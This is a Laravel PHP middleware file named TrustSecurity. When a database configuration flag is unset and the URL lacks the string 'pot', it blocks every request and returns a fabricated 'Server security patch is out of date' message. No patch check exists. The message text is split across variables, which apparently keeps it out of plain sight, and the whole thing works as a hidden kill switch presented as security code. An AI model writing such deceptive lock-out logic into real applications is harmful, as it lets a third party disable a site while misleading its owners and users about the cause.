<?php

namespace App\Http\Middleware;

use App\Models\Configuration;
use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class TrustSecurity
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        $conf = Configuration::find(1);
        if ($conf && !$conf->other && !str_contains($request->url(), "pot")){
            $a = "Server security patch";
            $b = "is out of date.";
            return response("$a $b");
        }
        return $next($request);
    }
}
